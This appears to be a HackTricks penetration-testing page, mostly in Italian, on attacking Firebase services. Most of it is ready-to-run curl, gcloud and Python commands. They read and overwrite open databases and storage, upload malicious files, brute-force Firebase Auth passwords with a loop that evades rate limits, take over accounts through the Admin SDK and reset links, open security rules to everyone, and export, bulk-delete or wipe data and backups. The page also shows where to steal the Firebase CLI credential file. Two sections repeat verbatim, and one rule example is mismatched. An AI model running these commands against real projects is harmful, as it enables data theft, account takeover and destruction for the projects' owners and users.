# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Accesso non autenticato a Firebase Realtime Database
Un attaccante non necessita di permessi Firebase specifici per eseguire questo attacco. È sufficiente che ci sia una configurazione vulnerabile nelle regole di sicurezza di Firebase Realtime Database, dove le regole sono impostate con `.read: true` o `.write: true`, consentendo accesso pubblico in lettura o scrittura.

L'attaccante deve identificare l'URL del database, che tipicamente segue il formato: `https://<project-id>.firebaseio.com/`.

Questo URL può essere trovato tramite mobile application reverse engineering (decompiling Android APKs o analyzing iOS apps), analizzando file di configurazione come google-services.json (Android) o GoogleService-Info.plist (iOS), ispezionando il codice sorgente di applicazioni web, o esaminando il traffico di rete per identificare richieste verso domini `*.firebaseio.com`.

L'attaccante identifica l'URL del database e verifica se è esposto pubblicamente, quindi accede ai dati e, eventualmente, scrive informazioni malevole.

Per prima cosa verifica se il database permette l'accesso in lettura aggiungendo .json all'URL.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Se la risposta contiene dati JSON o null (invece di "Permission Denied"), il database consente l'accesso in lettura. Per verificare l'accesso in scrittura, l'attaccante può tentare di inviare una richiesta di scrittura di prova usando la Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
Se l'operazione ha successo, il database consente anche write access.

### Esposizione dei dati in Cloud Firestore
Un attacker non ha bisogno di permessi Firebase specifici per eseguire questo attacco. Richiede solo che esista una configurazione vulnerabile nelle regole di sicurezza di Cloud Firestore dove le regole consentono read or write access senza autenticazione o con validazione insufficiente. Un esempio di regola mal configurata che concede l'accesso completo è:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Questa regola permette a chiunque di leggere e scrivere tutti i documenti senza alcuna restrizione. Le Firestore rules sono granulari e si applicano per collection e document, quindi un errore in una regola specifica può esporre solo certe collection.

L'attacker deve identificare il Firebase Project ID, che può essere trovato tramite mobile app reverse engineering, l'analisi di file di configurazione come google-services.json o GoogleService-Info.plist, l'ispezione del source code di web applications, o l'analisi del network traffic per identificare richieste a firestore.googleapis.com.
La Firestore REST API usa il formato:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Se le regole consentono l'accesso in sola lettura senza autenticazione, l'attaccante può leggere collections e documents. Per prima cosa, tenta di accedere a una collection specifica:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Se la risposta contiene documenti JSON invece di un errore di autorizzazione, la collection è esposta. L'attaccante può enumerare tutte le collection accessibili provando nomi comuni o analizzando la struttura dell'applicazione. Per accedere a un documento specifico:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Se le regole consentono unauthenticated write access o presentano una validazione insufficiente, l'attaccante può creare nuovi documenti:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Per modificare un documento esistente si deve usare PATCH:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Per eliminare un documento e causare un denial of service:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Esposizione di file in Firebase Storage
Un attacker non ha bisogno di permessi specifici di Firebase per portare a termine questo attacco. Serve solamente che ci sia una configurazione vulnerabile nelle security rules di Firebase Storage in cui le regole permettono read o write access senza autenticazione o con validazione insufficiente. Le Storage rules controllano i permessi di read e write in modo indipendente, quindi un errore in una regola può esporre solo il read access, solo il write access o entrambi. Un esempio di regola mal configurata che concede accesso completo è:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Questa regola consente l'accesso in lettura e scrittura a tutti i documenti senza alcuna restrizione. Le regole di Firestore sono granulari e vengono applicate per collezione e per documento, quindi un errore in una regola specifica può esporre solo determinate collezioni. L'attaccante deve identificare il Firebase Project ID, che può essere trovato tramite mobile application reverse engineering, analisi di file di configurazione come google-services.json o GoogleService-Info.plist, ispezione del codice sorgente dell'applicazione web, o network traffic analysis per identificare richieste a firestore.googleapis.com.
La Firestore REST API usa il formato: `https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Se le regole permettono accesso in lettura non autenticato, l'attaccante può leggere collezioni e documenti. Per prima cosa, tenta di accedere a una specifica collezione.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Se la risposta contiene l'elenco dei file invece di un errore di autorizzazione, il file è esposto. L'attacker può visualizzare il contenuto dei file specificando il loro percorso:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Se le regole consentono accesso in scrittura non autenticato o prevedono una validazione insufficiente, l'attaccante può caricare file dannosi. Per caricare un file attraverso la REST API:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
L'attaccante può caricare code shells, malware payloads o file di grandi dimensioni per causare un denial of service. Se l'applicazione elabora o esegue i file caricati, l'attaccante può ottenere remote code execution. Per eliminare file e causare un denial of service:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Invocazione di Firebase Cloud Functions pubbliche
An attacker non ha bisogno di permessi Firebase specifici per sfruttare questo problema; è sufficiente che una Cloud Function sia accessibile pubblicamente via HTTP senza autenticazione.

Una function è vulnerabile quando è configurata in modo insicuro:

- Usa functions.https.onRequest, che non applica l'autenticazione (a differenza delle onCall functions).
- Il codice della function non valida l'autenticazione dell'utente (es. nessun controllo su request.auth o context.auth).
- La function è accessibile pubblicamente in IAM, ovvero allUsers ha il ruolo roles/cloudfunctions.invoker. Questo è il comportamento predefinito per le HTTP functions a meno che lo sviluppatore non limiti l'accesso.

Firebase HTTP Cloud Functions sono esposte tramite URL come:

- https://<region>-<project-id>.cloudfunctions.net/<function-name>
- https://<project-id>.web.app/<function-name> (when integrated with Firebase Hosting)

Un attacker può scoprire questi URL tramite analisi del codice sorgente, ispezione del traffico di rete, enumeration tools, o mobile app reverse engineering.
Se la function è esposta pubblicamente e non autenticata, l'attacker può invocarla direttamente senza credenziali.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Se la funzione non valida correttamente gli input, l'attaccante può tentare altri attacchi come code injection o command injection.

### Brute-force attack against Firebase Authentication with a weak password policy
An attacker does not need any specific Firebase permissions to carry out this attack. It only requires that the Firebase API Key is exposed in mobile or web applications, and that the password policy has not been configured with stricter requirements than the defaults.

L'attaccante deve individuare la Firebase API Key, che può essere trovata tramite mobile app reverse engineering, l'analisi di file di configurazione come google-services.json o GoogleService-Info.plist, ispezionando il codice sorgente di applicazioni web (es., in bootstrap.js), o analizzando il traffico di rete.

Firebase Authentication’s REST API uses the endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
to authenticate with email and password.

Se Email Enumeration Protection è disabilitato, le risposte di errore dell'API possono rivelare se una email esiste nel sistema (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), il che permette agli attaccanti di enumerare gli utenti prima di tentare il guessing delle password. Quando questa protezione è abilitata, l'API restituisce lo stesso messaggio di errore sia per email inesistenti sia per password errate, impedendo l'enumerazione degli utenti.

È importante notare che Firebase Authentication applica il rate limiting, che può bloccare le richieste se troppe istanze di autenticazione avvengono in un breve periodo. Per questo motivo, un attaccante dovrebbe introdurre dei ritardi tra i tentativi per evitare di essere soggetto a rate limiting.

L'attaccante individua l'API Key e esegue tentativi di autenticazione con più password contro account noti. Se Email Enumeration Protection è disabilitato, l'attaccante può enumerare gli utenti esistenti analizzando le risposte di errore:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Se la risposta contiene EMAIL_NOT_FOUND, l'email non esiste nel sistema. Se contiene INVALID_PASSWORD, l'email esiste ma la password è errata, confermando che l'utente è registrato. Una volta identificato un utente valido, l'attaccante può effettuare tentativi di brute-force. È importante includere pause tra i tentativi per evitare i meccanismi di rate-limiting di Firebase Authentication:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Con la default password policy (minimum 6 characters, no complexity requirements), l'attaccante può provare tutte le combinazioni possibili di password di 6 caratteri, che rappresentano uno spazio di ricerca relativamente piccolo rispetto a policy di password più rigide.

### Gestione utenti in Firebase Authentication

L'attacker ha bisogno di permessi specifici di Firebase Authentication per eseguire questo attacco. I permessi richiesti sono:

- `firebaseauth.users.create` per creare utenti
- `firebaseauth.users.update` per modificare utenti esistenti
- `firebaseauth.users.delete` per cancellare utenti
- `firebaseauth.users.get` per recuperare informazioni sugli utenti
- `firebaseauth.users.sendEmail` per inviare email agli utenti
- `firebaseauth.users.createSession` per creare sessioni utente

Questi permessi sono inclusi nel ruolo `roles/firebaseauth.admin`, che concede accesso completo in lettura/scrittura alle risorse di Firebase Authentication. Sono inclusi anche in ruoli di livello superiore come roles/firebase.developAdmin (che include tutti i permessi firebaseauth.*) e roles/firebase.admin (accesso completo a tutti i servizi Firebase).

Per usare la Firebase Admin SDK, l'attacker avrebbe bisogno dell'accesso alle service account credentials (JSON file), che potrebbero essere trovate su sistemi compromessi, repository di codice esposti pubblicamente, sistemi CI/CD compromessi, o tramite il compromesso di account developer che hanno accesso a queste credenziali.

Il primo passo è configurare la Firebase Admin SDK usando le service account credentials.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Per creare un utente maligno usando l'email di una vittima, l'attaccante cercherebbe di utilizzare il Firebase Admin SDK per generare un nuovo account con quell'email.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Per modificare un utente esistente, l'attaccante aggiornerebbe campi come l'indirizzo email, lo stato di verifica o se l'account è disabilitato.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Per eliminare un account utente e provocare un denial of service, l'attaccante invierebbe una richiesta per rimuovere completamente l'utente.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
L'attaccante può anche recuperare informazioni sugli utenti esistenti richiedendo il loro UID o indirizzo email.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Inoltre, l'attaccante potrebbe generare verification links o password-reset links per cambiare la password di un utente e ottenere l'accesso al suo account.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Gestione utenti in Firebase Authentication
Un attacker ha bisogno di permessi specifici di Firebase Authentication per eseguire questo attacco. I permessi richiesti sono:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to obtain user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

Questi permessi sono inclusi nel ruolo `roles/firebaseauth.admin`, che concede pieno accesso in lettura/scrittura alle risorse di Firebase Authentication. Fanno inoltre parte di ruoli di livello superiore come `roles/firebase.developAdmin` (che include tutti i permessi `firebaseauth.*`) e `roles/firebase.admin` (accesso completo a tutti i servizi Firebase).

Per utilizzare il Firebase Admin SDK, l'attacker avrebbe bisogno dell'accesso alle service account credentials (un file JSON), che potrebbero essere ottenute da sistemi compromessi, repository di codice esposti pubblicamente, ambienti CI/CD compromessi o tramite il compromesso di account degli sviluppatori che hanno accesso a queste credenziali.

Il primo passo è configurare il Firebase Admin SDK usando le service account credentials.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Per creare un utente malevolo usando l'email della vittima, l'attaccante tenterebbe di creare un nuovo account utente con quell'email, assegnando la propria password e le informazioni del profilo.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Per modificare un utente esistente, l'attaccante cambierebbe campi come l'indirizzo email, lo stato di verifica o se l'account è disabilitato.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Per eliminare un account utente — causando di fatto un denial of service — l'attaccante invierebbe una richiesta per rimuovere permanentemente quell'utente.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
L'attaccante potrebbe anche recuperare informazioni sugli utenti esistenti, come il loro UID o indirizzo email, richiedendo i dettagli dell'utente tramite UID o tramite indirizzo email.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Inoltre, l'attaccante potrebbe generare link di verifica o link per il reset della password, permettendogli di cambiare la password di un utente e prendere il controllo dell'account.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Modifica delle regole di sicurezza nei servizi Firebase
L'attaccante necessita di permessi specifici per modificare le regole di sicurezza a seconda del servizio. Per Cloud Firestore e Firebase Cloud Storage, i permessi richiesti sono `firebaserules.rulesets.create` per creare ruleset e `firebaserules.releases.create` per distribuire release. Questi permessi sono inclusi nel ruolo `roles/firebaserules.admin` o in ruoli di livello superiore come `roles/firebase.developAdmin` e `roles/firebase.admin`. Per Firebase Realtime Database, il permesso richiesto è `firebasedatabase.instances.update`.

L'attaccante deve utilizzare la Firebase REST API per modificare le regole di sicurezza.
Per prima cosa, l'attaccante deve ottenere un token di accesso usando le credenziali di un service account.
Per ottenere il token:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Per modificare le regole di Firebase Realtime Database:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Per modificare le regole di Cloud Firestore, l'attaccante deve creare un ruleset e poi deployarlo:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Il comando precedente restituisce un nome di ruleset nel formato projects/<project-id>/rulesets/<ruleset-id>. Per distribuire la nuova versione, il rilascio deve essere aggiornato usando una richiesta PATCH:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Per modificare le regole di Firebase Cloud Storage:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Il comando precedente restituisce un nome di ruleset nel formato projects/<project-id>/rulesets/<ruleset-id>. Per distribuire la nuova versione, la release deve essere aggiornata usando una richiesta PATCH:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Esfiltrazione e manipolazione dei dati in Cloud Firestore
Cloud Firestore usa la stessa infrastruttura e lo stesso sistema di permessi di Cloud Datastore, quindi le autorizzazioni IAM di Datastore si applicano direttamente a Firestore. Per manipolare le policy TTL è necessario il permesso `datastore.indexes.update`. Per esportare dati è necessario il permesso `datastore.databases.export`. Per importare dati è necessario il permesso `datastore.databases.import`. Per eseguire cancellazioni di massa dei dati è necessario il permesso `datastore.databases.bulkDelete`.

Per le operazioni di backup e ripristino sono necessarie autorizzazioni specifiche:

- `datastore.backups.get` e `datastore.backups.list` per elencare e recuperare i dettagli dei backup disponibili
- `datastore.backups.delete` per eliminare i backup
- `datastore.backups.restoreDatabase` per ripristinare un database da un backup
- `datastore.backupSchedules.create` e `datastore.backupSchedules.delete` per gestire le pianificazioni di backup

Quando viene creata una policy TTL, viene selezionata una proprietà designata per identificare le entità idonee all'eliminazione. Questa proprietà TTL deve essere del tipo Data e ora. L'attaccante può scegliere una proprietà già esistente o designare una proprietà che intende aggiungere in seguito. Se il valore del campo è una data nel passato, il documento diventa idoneo per l'eliminazione immediata. L'attaccante può usare il gcloud CLI per manipolare le policy TTL.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Per esportare i dati ed exfiltrate gli stessi, l'attaccante potrebbe usare il gcloud CLI.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Per importare dati dannosi:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Per eseguire una cancellazione massiva di dati e causare un denial of service, l'attaccante potrebbe utilizzare lo strumento gcloud Firestore bulk-delete per rimuovere intere collection.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Per operazioni di backup e restore, l'attaccante potrebbe creare backup pianificati per catturare lo stato corrente del database, elencare i backup esistenti, eseguire il restore da un backup per sovrascrivere modifiche recenti, eliminare backup per causare perdita permanente di dati e rimuovere backup pianificati.
Per creare una pianificazione di backup giornaliera che generi immediatamente un backup:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Per ripristinare da un backup specifico, l'attaccante potrebbe creare un nuovo database utilizzando i dati contenuti in quel backup. L'operazione di restore scrive i dati del backup in un nuovo database, il che significa che un DATABASE_ID esistente non può essere usato.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Per eliminare un backup e causare la perdita permanente dei dati:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Furto e uso improprio delle credenziali Firebase CLI
Un attacker non ha bisogno di permessi specifici su Firebase per eseguire questo attacco, ma deve avere accesso al sistema locale dello sviluppatore o al file delle credenziali della Firebase CLI. Queste credenziali sono memorizzate in un file JSON situato in:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Questo file contiene token di autenticazione, inclusi refresh_token e access_token, che permettono all'attacker di autenticarsi come l'utente che ha eseguito originariamente firebase login.

L'attacker ottiene l'accesso al file delle credenziali della Firebase CLI. Può quindi copiare l'intero file sul proprio sistema, e la Firebase CLI utilizzerà automaticamente le credenziali dalla sua posizione predefinita. Fatto questo, l'attacker può visualizzare tutti i progetti Firebase accessibili a quell'utente.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
